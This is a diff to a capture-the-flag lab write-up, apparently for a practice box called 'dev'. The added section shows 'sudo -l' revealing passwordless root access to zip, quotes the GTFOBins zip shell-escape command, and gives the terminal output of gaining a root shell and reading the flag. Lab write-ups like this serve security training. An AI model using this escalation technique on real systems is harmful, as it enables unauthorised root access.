@@ -294,8 +294,6 @@ However, the id_rsas needs a passphrase, let's use the password that we saw whil
 
 Can't use dictionary attack as there is no I_love_java there
 
-We can dictionary attack with list of password using the /usr/share/dirbuster/wordlists/rockyou.txt but there is no word like I_love_java there 
-
 we can check `cat /usr/share/wordlists/rockyou.txt | grep I_love_java`
 
 ```
@@ -324,5 +322,78 @@ Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
 jeanpaul@dev:~$ 
 
 ```
+
+
+Executing `history` and `sudo -l` for checking, we see that we can run /usr/bin/zip as root no password
+
+```
+jeanpaul@dev:~$ history
+    1  echo "" > .bash_history 
+    2  sudo -l
+    3  exit
+    4  ls
+    5  ip a s
+    6  history
+jeanpaul@dev:~$ sudo -l
+Matching Defaults entries for jeanpaul on dev:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jeanpaul may run the following commands on dev:
+    (root) NOPASSWD: /usr/bin/zip
+jeanpaul@dev:~$ 
+
+```
+
+Check online how to run root with zip privileges. Search gtfo bin
+
+#gtfobin
+#zip
+#rootprivilege
+
+Here is the command that we will use according to gtfo bin https://gtfobins.github.io/gtfobins/zip/
+
+```
+ .. / zip
+
+    Shell File read Sudo Limited SUID 
+
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+    TF=$(mktemp -u)
+    zip $TF /etc/hosts -T -TT 'sh #'
+    rm $TF
+
+```
+
+We were able to access root and the flag
+
+```
+jeanpaul@dev:~$ TF=$(mktemp -u)
+jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+# ls -al
+total 28
+drwxr-xr-x 3 jeanpaul jeanpaul 4096 Jun  2  2021 .
+drwxr-xr-x 3 root     root     4096 Jun  1  2021 ..
+-rw------- 1 jeanpaul jeanpaul   39 Jun 28  2021 .bash_history
+-rw-r--r-- 1 jeanpaul jeanpaul  220 Jun  1  2021 .bash_logout
+-rw-r--r-- 1 jeanpaul jeanpaul 3526 Jun  1  2021 .bashrc
+-rw-r--r-- 1 jeanpaul jeanpaul  807 Jun  1  2021 .profile
+drwx------ 2 jeanpaul jeanpaul 4096 Jun  2  2021 .ssh
+# cd /root      
+# ls
+flag.txt
+# cat flag.txt  
+Congratz on rooting this box !
+
+```
+
+
 
 
